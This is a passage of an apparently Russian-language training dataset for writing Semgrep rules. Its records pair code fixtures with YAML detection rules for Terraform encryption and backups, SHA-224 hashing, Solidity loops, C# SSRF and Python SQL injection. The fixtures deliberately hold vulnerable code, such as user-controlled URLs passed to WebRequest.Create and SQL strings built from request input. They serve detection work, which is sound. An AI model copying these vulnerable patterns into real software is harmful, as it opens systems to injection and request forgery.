    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-320: CWE CATEGORY: Key Management Errors\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-timestream-database-encrypted-with-cmk.tf\n# pass\n\nresource \"aws_timestreamwrite_database\" \"enabled\" {\n  database_name = \"timestream\"\n\n  kms_key_id = var.kms_key_id\n}\n\n# failure\n# ruleid: aws-timestream-database-encrypted-with-cmk\nresource \"aws_timestreamwrite_database\" \"default\" {\n  database_name = \"timestream\"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_timestreamwrite_database\" \"default\" { \n  database_name = \"timestream\"\n}\n• resource \"aws_timestreamwrite_database\" \"example\" { \n  database_name = \"example_db\"\n}\n\nБезопасные паттерны:  \n• resource \"aws_timestreamwrite_database\" \"enabled\" { \n  database_name = \"timestream\"\n  kms_key_id = var.kms_key_id\n}\n• resource \"aws_timestreamwrite_database\" \"another\" { \n  database_name = \"another_db\"\n  kms_key_id = var.kms_key_id\n}\n\nЛегенда аннотаций:\n- // ruleid:aws-timestream-database-encrypted-with-cmk: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-timestream-database-encrypted-with-cmk: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-timestream-database-encrypted-with-cmk\n  patterns:\n  - pattern: |\n      resource \"aws_timestreamwrite_database\" $ANYTHING {\n        ...\n      }\n  - pattern-not-inside: |\n      resource \"aws_timestreamwrite_database\" $ANYTHING {\n        ...\n        kms_key_id = ...\n        ...\n      }\n  message: >-\n    Ensure Timestream database is encrypted at rest using KMS CMKs. CMKs gives you control over the encryption\n    key in terms of access and rotation.\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    cwe:\n    - 'CWE-320: CWE CATEGORY: Key Management Errors'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов AWS Timestream Database в Terraform конфигурациях HCL. Правило проверяет наличие атрибута 'kms_key_id' внутри ресурса 'aws_timestreamwrite_database'. Если этот атрибут отсутствует, то ресурс считается небезопасным, так как данные базы могут не быть зашифрованы с использованием ключей управления ключами (CMK), что нарушает лучшие практики безопасности. Паттерн ищет ресурсы с любым именем и любыми параметрами, но исключает те, у которых явно указан атрибут 'kms_key_id', указывая на отсутствие шифрования.\n\n# Ключевые элементы:\n- ID: aws-timestream-database-encrypted-with-cmk\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-timestream-database-encrypted-with-cmk",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения aws-elasticache-automatic-backup-not-enabled\nОписание уязвимости: Ensure that Amazon ElastiCache clusters have automatic backup turned on. To fix this, set a `snapshot_retention_limit`.\nCWE: \nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-elasticache-automatic-backup-not-enabled.tf\n# pass\n\nresource \"aws_elasticache_cluster\" \"enabled\" {\n  cluster_id           = \"cluster\"\n  engine               = \"redis\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.redis6.x\"\n\n  snapshot_retention_limit = 5\n}\n\n# failure\n# ruleid: aws-elasticache-automatic-backup-not-enabled\nresource \"aws_elasticache_cluster\" \"default\" {\n  cluster_id           = \"cluster\"\n  engine               = \"redis\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.redis6.x\"\n}\n# ruleid: aws-elasticache-automatic-backup-not-enabled\nresource \"aws_elasticache_cluster\" \"disabled\" {\n  cluster_id           = \"cluster\"\n  engine               = \"redis\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.redis6.x\"\n\n  snapshot_retention_limit = 0\n}\n\n# unknown\n\nresource \"aws_elasticache_cluster\" \"memcached\" {\n  cluster_id           = \"cluster\"\n  engine               = \"memcached\"\n  node_type            = \"cache.m5.large\"\n  num_cache_nodes      = 1\n  parameter_group_name = \"default.memcached1.6 \"\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_elasticache_cluster\" \"default\" { ... }\n• resource \"aws_elasticache_cluster\" \"disabled\" { ... snapshot_retention_limit = 0 ... }\n\nБезопасные паттерны:  \n• resource \"aws_elasticache_cluster\" \"enabled\" { ... snapshot_retention_limit = 5 ... }\n• resource \"aws_elasticache_cluster\" \"memcached\" { ... engine = \"memcached\" ... }\n\nЛегенда аннотаций:\n- // ruleid:aws-elasticache-automatic-backup-not-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-elasticache-automatic-backup-not-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-elasticache-automatic-backup-not-enabled\n  patterns:\n  - pattern-either:\n    - patterns:\n      - pattern: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n          }\n      - pattern-not-inside: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n            engine = \"memcached\"\n            ...\n          }\n      - pattern-not-inside: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n            snapshot_retention_limit = ...\n            ...\n          }\n    - patterns:\n      - pattern: |\n          resource \"aws_elasticache_cluster\" $ANYTHING {\n            ...\n            snapshot_retention_limit = $LIMIT\n            ...\n          }\n      - metavariable-comparison:\n          metavariable: $LIMIT\n          comparison: $LIMIT == 0\n  message: >-\n    Ensure that Amazon ElastiCache clusters have automatic backup turned on. To fix this, set a `snapshot_retention_limit`.\n  metadata:\n    category: best-practice\n    technology:\n    - terraform\n    - aws\n  languages: [hcl]\n  severity: WARNING\n\n# Логика правила:\nЭто правило Semgrep ищет ресурсы AWS Elasticache типа 'aws_elasticache_cluster' в конфигурациях Terraform (HCL). Оно проверяет наличие параметра 'snapshot_retention_limit'. Если этот параметр отсутствует или установлен в значение 0, то правило считает это опасным состоянием, так как автоматическое создание резервных копий отключено. Правило также исключает случаи, когда используется движок memcached, поскольку он не поддерживает автоматические резервные копии.\n\n# Ключевые элементы:\n- ID: aws-elasticache-automatic-backup-not-enabled\n- Язык: hcl \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-elasticache-automatic-backup-not-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: use-of-sha224\nОписание уязвимости: This code uses a 224-bit hash function, which is deprecated or disallowed in some security policies. Consider updating to a stronger hash function such as SHA-384 or higher to ensure compliance and security.\nCWE: CWE-328: Use of Weak Hash\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: CWE-328: Use of Weak Hash\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: use-of-sha224.java\nimport java.security.MessageDigest;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport static org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_224;\n\npublic class Bad {\n  public byte[] bad1(String password) {\n    // ruleid: use-of-sha224\n    MessageDigest sha224Digest = MessageDigest.getInstance(\"SHA-224\");\n    sha224Digest.update(password.getBytes());\n    byte[] hashValue = sha224Digest.digest();\n    return hashValue;\n  }\n\n  public byte[] bad2(String password) {\n    // ruleid: use-of-sha224\n    byte[] hashValue = DigestUtils.getSha3_224Digest().digest(password.getBytes());\n    return hashValue;\n  }\n\n  public void bad3() {\n    // ruleid: use-of-sha224\n    java.security.MessageDigest md = java.security.MessageDigest.getInstance(\"sha224\", \"SUN\");\n    byte[] input = { (byte) '?' };\n    Object inputParam = bar;\n    if (inputParam instanceof String)\n      input = ((String) inputParam).getBytes();\n    if (inputParam instanceof java.io.InputStream) {\n      byte[] strInput = new byte[1000];\n      int i = ((java.io.InputStream) inputParam).read(strInput);\n      if (i == -1) {\n        response.getWriter()\n            .println(\n                \"This input source requires a POST, not a GET. Incompatible UI for the InputStream source.\");\n        return;\n      }\n      input = java.util.Arrays.copyOf(strInput, i);\n    }\n    md.update(input);\n    byte[] result = md.digest();\n    java.io.File fileTarget = new java.io.File(\n        new java.io.File(org.owasp.benchmark.helpers.Utils.TESTFILES_DIR),\n        \"passwordFile.txt\");\n    java.io.FileWriter fw = new java.io.FileWriter(fileTarget, true); // the true will append the new data\n    fw.write(\n        \"hash_value=\"\n            + org.owasp.esapi.ESAPI.encoder().encodeForBase64(result, true)\n            + \"\\n\");\n    fw.close();\n  }\n\n  public byte[] bad4(String password) {\n    // ruleid: use-of-sha224\n    byte [] hashValue = new DigestUtils(SHA_224).digest(password.getBytes());\n    return h  # Ограничиваем длину\n\nОпасные паттерны:\n• MessageDigest sha224Digest = MessageDigest.getInstance(\"SHA-224\");\n• byte[] hashValue = DigestUtils.getSha3_224Digest().digest(password.getBytes());\n• new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_224)\n\nБезопасные паттерны:  \n• MessageDigest sha256Digest = MessageDigest.getInstance(\"SHA-256\");\n• byte[] hashValue = DigestUtils.getSha3_512Digest().digest(password.getBytes());\n• new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_384)\n\nЛегенда аннотаций:\n- // ruleid:use-of-sha224: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-of-sha224: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-of-sha224\n  message: >-\n    This code uses a 224-bit hash function, which is deprecated or disallowed\n    in some security policies. Consider updating to a stronger hash function such\n    as SHA-384 or higher to ensure compliance and security.\n  languages: [java]\n  severity: WARNING\n  metadata:\n    functional-categories:\n      - 'crypto::search::hash-algorithm::javax.crypto'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-328: Use of Weak Hash'\n    asvs:\n      section: V6 Stored Cryptography Verification Requirements\n      control_id: 6.2.5 Insecure Algorithm\n      control_url: https://github.com/OWASP/ASVS/blob/master/4.0/en/0x14-V6-Cryptography.md#v62-algorithms\n      version: '4'\n    category: security\n    technology:\n    - java\n    references:\n    - https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar3.ipd.pdf\n    - https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-cryptography\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: LOW\n    confidence: HIGH\n  pattern-either:\n  - pattern: org.apache.commons.codec.digest.DigestUtils.getSha3_224Digest()\n  - pattern: org.apache.commons.codec.digest.DigestUtils.getSha512_224Digest()\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha3_224(...)\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha3_224Hex(...)\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha512_224(...)\n  - pattern: org.apache.commons.codec.digest.DigestUtils.sha512_224Hex(...)\n  - pattern: new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_224)\n  - pattern: new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA_512_224)\n  - pattern: new org.apache.commons.codec.digest.DigestUtils(org.apache.commons.codec.digest.MessageDigestAlgorithms.SHA3_224)\n  - patterns:\n    - pattern: java.security.MessageDigest.getInstance(\"$ALGO\", ...);\n    - metavariable-regex:\n        metavariable: $ALGO\n        regex: '.*224'\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования хэш-функции SHA-224, которая считается устаревшей или запрещенной в некоторых политиках безопасности. Паттерны включают явное указание SHA-224 через классы и методы Apache Commons Codec DigestUtils и Java Security MessageDigest, а также регулярные выражения для метавариабельной ALGO, содержащей строку '224'. Правило применимо только к языку Java.\n\n# Ключевые элементы:\n- ID: use-of-sha224\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-of-sha224",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: state-variable-read-in-a-loop\nОписание уязвимости: Replace state variable reads and writes within loops with local variable reads and writes.\nCWE: \nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: state-variable-read-in-a-loop.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Test {\n    uint256 z;\n    function doit1(uint256 a) public pure returns (uint256 x) {\n        // ruleid: state-variable-read-in-a-loop\n        for (uint256 i; i<z;i++) {\n            // do smth\n        }\n    }\n\n    function doit2(uint256 a) public pure returns (uint256 x) {\n        // ruleid: state-variable-read-in-a-loop\n        for (uint256 i; i<z;i++) {\n            // ruleid: state-variable-read-in-a-loop\n            uint256 k = z;\n        }\n    }\n\n    function doit3(uint256 a) public pure returns (uint256 x) {\n        // ruleid: state-variable-read-in-a-loop\n        while (i<z) {\n            // ruleid: state-variable-read-in-a-loop\n            uint256 k = z;\n        }\n    }\n\n    function doit4(uint256 a) public pure returns (uint256 x) {\n        // ok: state-variable-read-in-a-loop\n        while (i<10) {\n            //...\n        }\n    }\n}\n\ncontract Test2 {\n    uint256 another_var;\n\n    function doit5(uint256 a) public pure returns (uint256 x) {\n        // ok: state-variable-read-in-a-loop\n        for (uint256 i; i<z;i++) {\n            // do smth\n        }\n    }\n}\n\ncontract Test3 {\n    uint256 immutable another_var = 100;\n\n    function doit5(uint256 a) public pure returns (uint256 x) {\n        uint256 var = 10;\n        // ok: state-variable-read-in-a-loop\n        for (uint256 i; i<z;i++) {\n            var += another_var;\n        }\n    }\n}\n\ncontract Test4 {\n    uint256 immutable another_var;\n\n    constructor() {\n        another_var = 101;\n    }\n    function doit5(uint256 a) public pure returns (uint256 x) {\n        uint256 var = 10;\n        // ok: state-variable-read-in-a-loop\n        for (uint256 i; i<z;i++) {\n            var += another_var;\n        }\n    }\n}\n\ncontract Test5 {\n    uint256 constant another_var = 100;\n\n    function doit5(uint256 a) public pure returns (uint256 x) {\n        uint256 var = 10;\n        // ok: state-variable-read-in-a-loo  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: state-variable-read-in-a-loop.sol\ncontract Test {\n    uint256 z;\n    function doit1(uint256 a) public pure returns (uint256 x) {\n        // ruleid: state-variable-read-in-a-loop\n        for (\n• // File: state-variable-read-in-a-loop.sol\ncontract Test {\n    uint256 z;\n    function doit2(uint256 a) public pure returns (uint256 x) {\n        // ruleid: state-variable-read-in-a-loop\n        for (\n• // File: state-variable-read-in-a-loop.sol\ncontract Test {\n    uint256 z;\n    function doit3(uint256 a) public pure returns (uint256 x) {\n        // ruleid: state-variable-read-in-a-loop\n        while\n\nБезопасные паттерны:  \n• // File: state-variable-read-in-a-loop.sol\ncontract Test2 {\n    uint256 another_var;\n    function doit5(uint256 a) public pure returns (uint256 x) {\n        // ok: state-variable-read-in-a-loop\n      \n• // File: state-variable-read-in-a-loop.sol\ncontract Test3 {\n    uint256 immutable another_var = 100;\n    function doit5(uint256 a) public pure returns (uint256 x) {\n        uint256 var = 10;\n        /\n• // File: state-variable-read-in-a-loop.sol\ncontract Test4 {\n    uint256 immutable another_var;\n    constructor() {\n        another_var = 101;\n    }\n    function doit5(uint256 a) public pure returns (u\n\nЛегенда аннотаций:\n- // ruleid:state-variable-read-in-a-loop: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:state-variable-read-in-a-loop: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: state-variable-read-in-a-loop\n    message: Replace state variable reads and writes within loops with local variable reads and writes.\n    metadata:\n      category: performance\n      technology:\n        - solidity\n      references:\n        - https://github.com/devanshbatham/Solidity-Gas-Optimization-Tips#10--replace-state-variable-reads-and-writes-within-loops-with-local-variable-reads-and-writes\n    patterns:\n      - pattern-either:\n          - pattern-inside: |\n              contract $C {\n                ...\n                $TYPE $X = ... ;\n                ...\n              }\n          - pattern-inside: |\n              contract $C {\n                ...\n                $TYPE $X;\n                ...\n              }\n      - pattern-not-inside: |\n            contract $C {\n                ...\n                $TYPE immutable $X;\n                ...\n            }\n      - pattern-not-inside: |\n            contract $C {\n                ...\n                $TYPE immutable $X = ...;\n                ...\n            }\n      - pattern-not-inside: |\n            contract $C {\n                ...\n                $TYPE constant $X = ...;\n                ...\n            }\n      - pattern: $X\n      - pattern-either:\n        - pattern-inside: |\n            for (...) {\n              ...\n            }\n        - pattern-inside: |\n            while (...) {\n              ...\n            }\n    languages:\n      - solidity\n    severity: INFO\n\n\n# Логика правила:\nЭто правило ищет контракты Solidity, содержащие чтение или запись переменных состояния внутри циклов 'for' или 'while'. Переменные состояния должны быть заменены локальными переменными для оптимизации газа и предотвращения потенциальных проблем с безопасностью. Правило использует шаблон, который сначала проверяет наличие объявлений переменных состояния ($TYPE $X), затем исключает случаи, когда эти переменные объявлены как неизменяемые ('immutable') или константы ('constant'). После этого оно проверяет наличие цикла, где может происходить доступ к этим переменным.\n\n# Ключевые элементы:\n- ID: state-variable-read-in-a-loop\n- Язык: solidity \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "state-variable-read-in-a-loop",
      "language": "solidity",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: ssrf\nОписание уязвимости: The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination. Many different options exist to fix this issue depending the use case (Application can send request only to identified and trusted applications, Application can send requests to ANY external IP address or domain name).\nCWE: CWE-918: Server-Side Request Forgery (SSRF)\nТип анализа: search\nЯзык: csharp",
    "input": "Требования:\n- Язык: csharp\n- Тип анализа: search\n- CWE: CWE-918: Server-Side Request Forgery (SSRF)\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: web-request.cs\nusing System.Net.WebRequest;\nusing System.Uri;\n\nnamespace Ssrf\n{\n    public class Ssrf\n    {\n        #region Pattern 1\n        // ruleid: ssrf\n        public void WebRequest(string host)\n        {\n            try\n            {\n                WebRequest webRequest = WebRequest.Create(host);;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        // ok: ssrf\n        public void WebRequest(string host)\n        {\n            try\n            {\n                WebRequest webRequest = WebRequest.Create(\"constant\");;\n            }\n            catch (Exception e)\n            {\n                System.Diagnostics.Debug.WriteLine(e);\n            }\n        }\n\n        #endregion\n\n        #region Pattern 2\n\n        // ruleid: ssrf\n        public void WebRequestWithStringConcatenation(string host)\n        {\n\n            String baseUrl = \"constant\" + host;\n\n            WebRequest webRequest = WebRequest.Create(baseUrl);\n        }\n\n        // ok: ssrf\n        public void WebRequestWithStringConcatenation(string host)\n        {\n            String baseUrl = \"constant\";\n            WebRequest webRequest = WebRequest.Create(baseUrl);\n        }\n\n        // ruleid: ssrf\n        public void WebRequestWithUri(string host)\n        {\n            Uri uri = new Uri(host);\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n\n        // ok: ssrf\n        public void ssrf5(string host)\n        {\n            Uri uri = new Uri(\"constant\");\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n\n        #endregion\n\n        #region Pattern 3\n\n        // ruleid: ssrf\n        public void WebRequestStringToUri(string host)\n        {\n\n            String baseUrl = \"constant\" + host;\n            Uri uri = new Uri(baseUrl);\n\n            WebRequest webRequest = WebRequest.Create(uri);\n        }\n\n        // ok: ssrf\n        public void WebRequestStringToUri(string  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequest(string host)\n{\n    try\n    {\n        WebRequest webRequest = WebRequest.Create(host);\n    }\n    catch (Exception e)\n    {\n        S\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithStringConcatenation(string host)\n{\n    String baseUrl = \"constant\" + host;\n    WebRequest webRequest = WebRequest.Create(baseUrl\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithUri(string host)\n{\n    Uri uri = new Uri(host);\n    WebRequest webRequest = WebRequest.Create(uri);\n}\n\nБезопасные паттерны:  \n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequest(string host)\n{\n    try\n    {\n        WebRequest webRequest = WebRequest.Create(\"constant\");\n    }\n    catch (Exception e)\n    {\n   \n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithStringConcatenation(string host)\n{\n    String baseUrl = \"constant\";\n    WebRequest webRequest = WebRequest.Create(baseUrl);\n}\n• // File: web-request.cs\nusing System.Net;\n...\npublic void WebRequestWithUri(string host)\n{\n    Uri uri = new Uri(\"constant\");\n    WebRequest webRequest = WebRequest.Create(uri);\n}\n\nЛегенда аннотаций:\n- // ruleid:ssrf: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:ssrf: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: ssrf\n  severity: ERROR\n  languages:\n  - csharp\n  metadata:\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    references:\n    - https://cwe.mitre.org/data/definitions/918.html\n    - https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\n    category: security\n    technology:\n    - .net\n    confidence: LOW\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: MEDIUM\n  message: >-\n    The web server receives a URL or similar request from an upstream component and retrieves the contents\n    of this URL, but\n    it does not sufficiently ensure that the request is being sent to the expected destination.\n    Many different options exist to fix this issue depending the use case (Application can send request\n    only to identified\n    and trusted applications, Application can send requests to ANY external IP address or domain name).\n  patterns:\n  - pattern-inside: |\n      using System.Net;\n      ...\n  - pattern-either:\n    - pattern: |\n        $T $F(..., $X, ...)\n        {\n        ...\n        ... WebRequest.Create(<... $X ...>);\n        }\n    - pattern: |\n        $T $F($X)\n        {\n        ...\n        $A $B = <... $X ...>;\n        ...\n        ... WebRequest.Create($B);\n        }\n    - pattern: |\n        $T $F($X)\n        {\n        ...\n        $A $B = <... $X ...>;\n        ...\n        $C $D = <... $B ...>;\n        ...\n        ... WebRequest.Create($D);\n        }\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска потенциальных уязвимостей SSRF (Server Side Request Forgery) в коде на языке C#. Анализируется создание объекта класса WebRequest через метод Create(), где аргумент передается извне или формируется динамически из входных данных. Правило использует шаблонный подход, проверяя наличие вызова метода Create() внутри блока, содержащего переменную, значение которой может быть изменено пользователем или получено из внешнего источника.\n\n# Ключевые элементы:\n- ID: ssrf\n- Язык: csharp \n- Тип: audit\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "ssrf",
      "language": "csharp",
      "severity": "ERROR",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: tainted-sql-string\nОписание уязвимости: Detected user input used to manually construct a SQL string. This is usually bad practice because manual construction could accidentally result in a SQL injection. An attacker could use a SQL injection to steal or modify contents of the database. Instead, use a parameterized query which is available by default in most database engines. Alternatively, consider using an object-relational mapper (ORM) such as Sequelize which will protect your queries.\nCWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\nТип анализа: taint\nЯзык: python\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: python\n- Тип анализа: taint\n- CWE: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-sql-string.py\nimport json\nimport secret_info\nimport mysql.connector\n\nRemoteMysql = secret_info.RemoteMysql\n\nmydb = mysql.connector.connect(host=RemoteMysql.host, user=RemoteMysql.user, passwd=RemoteMysql.passwd, database=RemoteMysql.database)\nmydbCursor = mydb.cursor()\n\ndef lambda_handler(event, context):\n    publicIP=event[\"queryStringParameters\"][\"publicIP\"]\n    # ruleid: tainted-sql-string\n    sql = \"\"\"UPDATE `EC2ServerPublicIP` SET %s = '%s' WHERE %s = %d\"\"\" % (\"publicIP\",publicIP,\"ID\", 1)\n\n    # ok: tainted-sql-string\n    print(\"\"\"UPDATE `EC2ServerPublicIP` SET %s = '%s' WHERE %s = %d\"\"\" % (\"publicIP\",publicIP,\"ID\", 1))\n    \n    mydbCursor.execute(sql)\n\n    # ok: tainted-sql-string\n    sql2 = \"UPDATE `EC2ServerPublicIP` SET %s = '%s' WHERE foo = %s\" % (\"one\", \"two\", \"three\")\n\n    # ok: tainted-sql-string\n    mydbCursor.execute(\"UPDATE `EC2ServerPublicIP` SET %s = '%s' WHERE %s = %s\", (\"publicIP\",publicIP,\"ID\", 1))\n\n    # ok: tainted-sql-string\n    sql3 = \"UPDATE `EC2ServerPublicIP` SET %s = '%s'\" + \" WHERE %s = %s\"\n    mydbCursor.execute(sql3, (\"publicIP\",publicIP,\"ID\", 1))\n    mydb.commit()\n    \n    Body={\n        \"publicIP\":publicIP\n        \n    }\n    return {\n        'statusCode': 200,\n        'body': json.dumps(Body)\n    }  # Ограничиваем длину\n\nОпасные паттерны:\n• sql = \"\"\"UPDATE \\`EC2ServerPublicIP\\\" SET %s = '%s' WHERE %s = %d\"\"\" % (\"publicIP\",publicIP,\"ID\", 1)\n• sql = \"\"\"SELECT * FROM users WHERE username = '%s' AND password = '%s'\"\"\" % (username,password)\n\nБезопасные паттерны:  \n• mydbCursor.execute(\"UPDATE \\`EC2ServerPublicIP\\\" SET %s = '%s' WHERE %s = %d\", (\"publicIP\",publicIP,\"ID\", 1))\n• sql = \"\"\"SELECT * FROM users WHERE username = :username AND password = :password\"\"\"; db.execute(sql, {'username': username, 'password': password})\n\nЛегенда аннотаций:\n- // ruleid:tainted-sql-string: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-sql-string: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-sql-string\n  languages:\n  - python\n  message: >-\n    Detected user input used to manually construct a SQL string. This is usually\n    bad practice because manual construction could accidentally result in a SQL\n    injection. An attacker could use a SQL injection to steal or modify contents\n    of the database. Instead, use a parameterized query which is available\n    by default in most database engines. Alternatively, consider using an\n    object-relational mapper (ORM) such as Sequelize which will protect your queries.\n  metadata:\n    references:\n    - https://owasp.org/www-community/attacks/SQL_Injection\n    category: security\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    cwe:\n    - \"CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\"\n    technology:\n    - aws-lambda\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: HIGH\n    impact: MEDIUM\n    confidence: MEDIUM\n  mode: taint\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          \"$SQLSTR\" + ...\n      - pattern: |\n          \"$SQLSTR\" % ...\n      - pattern: |\n          \"$SQLSTR\".format(...)\n      - pattern: |\n          f\"$SQLSTR{...}...\"\n    - metavariable-regex:\n        metavariable: $SQLSTR\n        regex: \\s*(?i)(select|delete|insert|create|update|alter|drop)\\b.*=\n    - pattern-not-inside: |\n        print(...)\n  pattern-sources:\n  - patterns:\n    - pattern: event\n    - pattern-inside: |\n        def $HANDLER(event, context):\n          ...\n  severity: ERROR\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования небезопасных методов построения SQL-запросов вручную, которые могут привести к SQL-инъекциям. Источники (sources) определяют, откуда может поступать потенциально загрязненный ввод пользователя. Синки (sinks) указывают, где этот ввод используется для создания SQL-запроса напрямую, без применения параметризованных запросов или ORM. Правило использует шаблоны для обнаружения конкатенации строк ($SQLSTR + ...) и форматирования строк ($SQLSTR % ...), а также регулярные выражения для выявления ключевых слов SQL-команд, таких как select, delete, insert и др., внутри строковых литералов.\n\n# Ключевые элементы:\n- ID: tainted-sql-string\n- Язык: python \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-sql-string",
      "language": "python",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения: twitch-api-token\nОписание уязвимости: A gitleaks twitch-api-token was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
